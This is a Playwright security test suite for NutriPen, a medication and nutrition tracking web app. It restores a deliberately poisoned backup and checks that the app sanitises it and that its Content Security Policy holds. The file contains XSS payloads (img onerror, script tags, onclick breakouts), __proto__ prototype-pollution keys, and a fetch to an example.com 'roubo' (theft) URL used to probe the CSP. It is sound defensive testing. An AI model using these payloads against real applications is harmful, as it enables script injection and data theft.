// Testes de segurança do NutriPen (versão da loja: loja/www).
// Uso: node testes/seguranca.js   (requer Playwright e loja/www gerado por scripts/build_store.py)
//
// Simula um backup adulterado com código malicioso em todos os campos, restaura pelo app,
// passa por todas as telas, aciona botões de excluir e confere que nada executou.
const { chromium } = require('playwright');
const http = require('http'); const fs = require('fs'); const path = require('path'); const os = require('os');

const WWW = process.env.NUTRIPEN_WWW || path.join(__dirname, '..', 'loja', 'www');
const TYPES = { '.html': 'text/html; charset=utf-8', '.css': 'text/css', '.js': 'text/javascript', '.woff2': 'font/woff2', '.png': 'image/png', '.json': 'application/json' };
const server = http.createServer((req, res) => {
  const f = path.join(WWW, decodeURIComponent(req.url.split('?')[0]).replace(/\/$/, '/index.html'));
  if (!f.startsWith(WWW) || !fs.existsSync(f)) { res.writeHead(404); return res.end(); }
  res.writeHead(200, { 'Content-Type': TYPES[path.extname(f)] || 'application/octet-stream' }); fs.createReadStream(f).pipe(res);
});

const X = `"><img src=x onerror="window.__pwned='img'"><script>window.__pwned='script'</script>`;
const JS = `x');window.__pwned='onclick';//`;
const today = new Date(Date.now() - new Date().getTimezoneOffset() * 6e4).toISOString().slice(0, 10);
const poisoned = {
  isDemo: false,
  profile: { name: X, age: '<b>40</b>', sex: X, height: 1e308, weight: 'NaN', goalWeight: -5, medication: X, dose: X,
    intervalDays: X, activityLevel: '__proto__', proteinFactor: X, customGeminiKey: 'CHAVE-DO-ATACANTE',
    reminder: { enabled: X, time: X }, conditions: { diabetes: 'yes', cholecystectomy: true, clinicalNotes: X } },
  dailyLogs: {
    [today]: { quickMacros: { protein: X, water: 1e99 }, habits: { [JS]: true, protein_first: true },
      meals: [{ id: JS, slot: X, time: X, desc: X, kcal: X, protein: 30, digest: X }] },
    [X]: { meals: [{ id: 'a', desc: 'data inválida' }] },
    '__proto__': { polluted: true }
  },
  diaryEntries: [{ id: JS, date: today, time: X, bowelStatus: X, symptomChips: [X, 'reflux'], notes: X },
                 { id: 'ok1', date: X, time: '08:00', bowelStatus: 'normal', notes: 'data maliciosa' }],
  glucoseLogs: [{ id: JS, date: today, time: '07:00', value: 95, context: X }, { id: 'g2', date: X, value: 90 }],
  injections: [{ id: JS, date: today, medication: X, dose: X, intervalDays: X, site: X }],
  weights: [{ id: JS, date: today, time: X, moment: X, weight: 80, waist: X, dose: X }, { id: 'w2', date: X, weight: 79 }],
  exams: [{ id: JS, date: today, values: { hba1c: X, ldl: 1e9, hdl: 50 } }, { id: 'e2', date: X, values: { hba1c: 6 } }],
  appointments: [{ id: JS, date: today, time: X, type: X, who: X, place: X, notes: X }],
  questions: [{ id: JS, text: X, done: X }],
  notifSeen: { [X]: true, ok_1: true },
  lastBackupAt: X
};
poisoned.profile.pen = { dosesPerPen: X, remaining: -5 };
poisoned.profile.cycle = { enabled: true, lastStart: X, length: 999 };
poisoned.profile.waterReminder = { enabled: true, every: X, start: X, end: X };
poisoned.profile.treatmentStart = X;
poisoned.dailyLogs[today].hunger = X;
poisoned.dailyLogs[today].activity = { type: X, minutes: 1e9 };
poisoned.injections[0].skipped = X;

const results = [];
const check = (name, ok, detail = '') => { results.push({ name, ok }); console.log(`${ok ? '✅' : '❌'} ${name}${detail ? ' — ' + detail : ''}`); };

(async () => {
  await new Promise(r => server.listen(0, r));
  const base = `http://localhost:${server.address().port}/`;
  const browser = await chromium.launch();
  const ctx = await browser.newContext({ viewport: { width: 400, height: 800 } });
  await ctx.addInitScript(() => { try { localStorage.setItem('nutripen_aviso_aceito_v1', '1'); } catch (e) {} });
  const page = await ctx.newPage();
  const errors = []; page.on('pageerror', e => errors.push(e.message)); page.on('dialog', d => d.dismiss());
  const external = new Set();
  page.on('request', r => { const u = new URL(r.url()); if (!['localhost', '127.0.0.1'].includes(u.hostname) && !u.protocol.startsWith('data') && !u.protocol.startsWith('blob')) external.add(u.hostname); });

  await page.goto(base); await page.waitForTimeout(300);
  await page.evaluate(() => { appState.profile.customGeminiKey = 'CHAVE-DO-USUARIO'; saveState(); });

  // Restaura o backup envenenado pelo caminho normal do app
  const file = path.join(os.tmpdir(), 'nutripen-backup-envenenado.json');
  fs.writeFileSync(file, JSON.stringify(poisoned));
  await page.setInputFiles('#input-import-json', file);
  await page.waitForSelector('#toast-container button:has-text("Restaurar")');
  await page.click('#toast-container button:has-text("Restaurar")');
  await page.waitForTimeout(400);

  // Passa por todas as abas e aciona excluir/repetir
  await page.evaluate(() => document.querySelectorAll('details[data-fold]').forEach(d => { d.open = true; }));
  for (const tab of ['diario', 'refeicoes', 'alimentos', 'caneta', 'evolucao', 'mais', 'relatorio']) {
    await page.evaluate(t => switchTab(t), tab); await page.waitForTimeout(120);
  }
  for (const tab of ['refeicoes', 'caneta', 'evolucao', 'mais']) {
    await page.evaluate(t => switchTab(t), tab);
    const btns = await page.$$('button[onclick^="delete"], button[onclick^="duplicate"]');
    for (const b of btns.slice(0, 3)) { try { await b.click({ timeout: 500 }); } catch (e) {} }
  }
  await page.waitForTimeout(300);

  const pwned = await page.evaluate(() => window.__pwned || null);
  check('Nenhum código malicioso executou (img/script/onclick)', !pwned, pwned ? `executou via ${pwned}` : '');
  const badOnclick = await page.$$eval('[onclick]', els => els.map(e => e.getAttribute('onclick')).filter(v => /__pwned|<|>/.test(v)));
  check('Atributos onclick sem conteúdo injetado', badOnclick.length === 0, badOnclick.slice(0, 2).join(' | '));
  const injected = await page.$$eval('img[onerror], script:not([src])', els => els.filter(e => (e.getAttribute('onerror') || e.textContent).includes('__pwned')).length);
  check('Nenhuma tag <img onerror>/<script> injetada no DOM', injected === 0);
  const st = await page.evaluate(() => ({
    key: appState.profile.customGeminiKey, name: appState.profile.name, med: appState.profile.medication, dose: appState.profile.dose,
    interval: appState.profile.intervalDays, logKeys: Object.keys(appState.dailyLogs), proto: ({}).polluted,
    ids: [...appState.diaryEntries, ...appState.glucoseLogs, ...appState.injections, ...appState.weights].map(x => x.id),
    dates: [...appState.diaryEntries, ...appState.glucoseLogs, ...appState.weights].map(x => x.date),
    reminder: appState.profile.reminder
  }));
  check('Chave da IA do aparelho preservada (backup não troca a chave)', st.key === 'CHAVE-DO-USUARIO', st.key);
  check('Medicação, dose e intervalo inválidos substituídos por valores seguros', st.med !== poisoned.profile.medication && /^\d+(\.\d+)?mg$/.test(st.dose) && Number.isInteger(st.interval));
  check('Datas inválidas descartadas (registros e chaves dos dias)', st.dates.every(d => /^\d{4}-\d{2}-\d{2}$/.test(d)) && st.logKeys.every(d => /^\d{4}-\d{2}-\d{2}$/.test(d)), st.logKeys.join(','));
  check('IDs inválidos substituídos por IDs seguros', st.ids.every(i => /^[A-Za-z0-9_-]{1,64}$/.test(i)));
  check('Sem poluição de protótipo (__proto__)', st.proto === undefined);
  const st2 = await page.evaluate(() => ({ ex: appState.exams, ap: appState.appointments, q: appState.questions, seen: Object.keys(appState.notifSeen), pen: appState.profile.pen, cyc: appState.profile.cycle, wr: appState.profile.waterReminder, ts: appState.profile.treatmentStart, day: appState.dailyLogs[Object.keys(appState.dailyLogs)[0]], lb: appState.lastBackupAt }));
  check('Exames: só valores numéricos dentro da faixa', st2.ex.length === 1 && st2.ex[0].values.hdl === 50 && st2.ex[0].values.hba1c === undefined && st2.ex[0].values.ldl === undefined);
  check('Consultas/perguntas: IDs seguros e tipo válido', st2.ap.every(a => /^[A-Za-z0-9_-]+$/.test(a.id) && ['medico', 'nutricionista', 'outro'].includes(a.type)) && st2.q.every(q => /^[A-Za-z0-9_-]+$/.test(q.id)));
  check('Avisos vistos: chaves inválidas descartadas', st2.seen.length === 1 && st2.seen[0] === 'ok_1', st2.seen.join(','));
  check('Estoque, ciclo, água e início do tratamento saneados', st2.pen.dosesPerPen === null && st2.pen.remaining === null && st2.cyc.lastStart === null && st2.cyc.length === 28 && st2.wr.every === 2 && st2.wr.start === '08:00' && st2.ts === null && st2.lb === null);
  check('Fome e atividade inválidas descartadas', st2.day.hunger === null && st2.day.activity === null);
  check('Lembrete com valores válidos', st.reminder.enabled === false && st.reminder.time === '09:00');
  check('Texto malicioso exibido apenas como texto', (await page.evaluate(() => document.getElementById('header-patient-summary').textContent)).includes('<img'));

  check('Nenhuma requisição externa durante o uso normal', external.size === 0, [...external].join(','));

  // CSP: a página não consegue enviar dados para fora
  // Exige o evento de violação da CSP (não basta a conexão falhar, o que também ocorre sem internet)
  const cspViolation = (kick) => page.evaluate(kick => new Promise(r => {
    const on = e => { document.removeEventListener('securitypolicyviolation', on); r(e.violatedDirective); };
    document.addEventListener('securitypolicyviolation', on);
    if (kick === 'fetch') fetch('https://example.com/roubo?d=1').catch(() => {});
    else { const i = new Image(); i.src = 'https://example.com/pixel.png'; }
    setTimeout(() => r(null), 2500);
  }), kick);
  const fetchDir = await cspViolation('fetch');
  check('CSP bloqueia conexão para fora do app', !!fetchDir, fetchDir || 'sem bloqueio da CSP');
  const imgDir = await cspViolation('img');
  check('CSP bloqueia imagem externa (rastreamento)', !!imgDir, imgDir || 'sem bloqueio da CSP');
  check('Sem erros de JavaScript', errors.length === 0, errors.slice(0, 2).join(' | '));

  // Arquivo gigante é recusado
  const big = path.join(os.tmpdir(), 'nutripen-grande.json'); fs.writeFileSync(big, '{"profile":{},"dailyLogs":{},"x":"' + 'a'.repeat(11 * 1024 * 1024) + '"}');
  await page.setInputFiles('#input-import-json', big); await page.waitForTimeout(300);
  check('Backup acima de 10 MB é recusado', (await page.textContent('#toast-container')).includes('grande demais'));

  await browser.close(); server.close();
  const fail = results.filter(r => !r.ok).length;
  console.log(`\n${results.length - fail}/${results.length} verificações aprovadas.`);
  process.exit(fail ? 1 : 0);
})();
